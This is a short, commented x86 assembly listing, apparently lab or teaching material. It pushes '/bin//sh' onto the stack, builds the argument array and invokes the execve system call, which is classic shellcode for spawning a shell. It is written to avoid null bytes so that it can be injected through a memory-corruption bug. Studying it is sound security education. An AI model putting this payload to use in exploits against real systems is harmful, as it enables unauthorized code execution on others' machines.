use32
; Store the command on stack
xor eax, eax
push eax
push "//sh"
push "/bin"
mov ebx, esp ; ebx --> "/bin//sh": execve()’s 1st argument
; Construct the argument array argv[]
push eax ; argv[1] = 0
push ebx ; argv[0] --> "/bin//sh"
mov ecx, esp ; ecx --> argv[]: execve()’s 2nd argument
; For environment variable
xor edx, edx ; edx = 0: execve()’s 3rd argument
; Invoke execve()
xor eax, eax ;
mov al, 0x0b ; execve()’s system call number
int 0x80
